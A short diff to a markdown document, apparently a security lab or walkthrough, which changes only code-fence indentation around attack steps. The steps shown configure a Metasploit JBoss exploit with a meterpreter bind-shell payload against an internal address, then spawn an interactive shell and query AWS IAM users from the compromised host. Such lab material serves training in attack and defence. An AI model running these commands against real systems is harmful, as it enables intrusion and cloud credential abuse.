@@ -173,23 +173,23 @@ aws ec2 describe-instances --region us-west-2 --filters Name=iam-instance-profil
 
 3. Configure the exploit.
 
-```
+  ```
 > use exploit/multi/http/jboss_invoke_deploy
 > set RHOST 10.0.6.165
 > set target 1
 > set payload java/meterpreter/bind_tcp
 > set LPORT 10001
 > exploit
-```
+  ```
 
 4. Run the AWS CLI to determine if this host has IAM permissions.
 
-```
+  ```
 > shell
 python -c 'import pty; pty.spawn("/bin/bash")'
 $ export http_proxy=http://proxy:3128
 $ export https_proxy=http://proxy:3128
 $ aws iam list-users --region us-west-2
-```
+  ```
 
   What does this mean?
